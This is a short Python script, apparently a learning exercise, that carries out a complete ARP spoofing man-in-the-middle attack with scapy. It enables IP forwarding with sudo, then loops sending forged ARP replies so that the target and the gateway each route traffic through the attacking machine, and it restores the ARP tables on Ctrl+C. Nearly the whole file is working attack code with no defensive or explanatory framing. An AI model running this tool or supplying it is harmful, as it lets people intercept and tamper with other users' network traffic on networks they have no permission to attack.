#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import subprocess
import argparse

def parsing_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target_ip",help="Specify target ip")
    parser.add_argument("-g","--gateway",dest="gateway_ip",help="Specify gateway ip")
    return parser.parse_args()

def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)  # CREATING ARP REQUEST OBJECT
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # CREATING ETHERNET PACKET OBJECT
    arp_request_broadcast = broadcast/arp_request   # Appending ARP Packet to Ether message
    answered_list = scapy.srp(arp_request_broadcast, timeout=1,verbose=False)[0]  # Capturing ARP Reply

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip,source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,count=4,verbose=False)

options=parsing_arguments()
target_ip=options.target_ip
gateway_ip=options.gateway_ip
subprocess.call(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])  # Port Forwarding Enabled
sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip,target_ip )
        print("\r[+] Packets Sent " + str(sent_packets_count),end=' ')
        sys.stdout.flush()
        sent_packets_count = sent_packets_count + 2
except KeyboardInterrupt:
    print("\nResetting ARP Tables")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)
    print("\n[-] Detected CTRL + C")
    print("Quiting...")
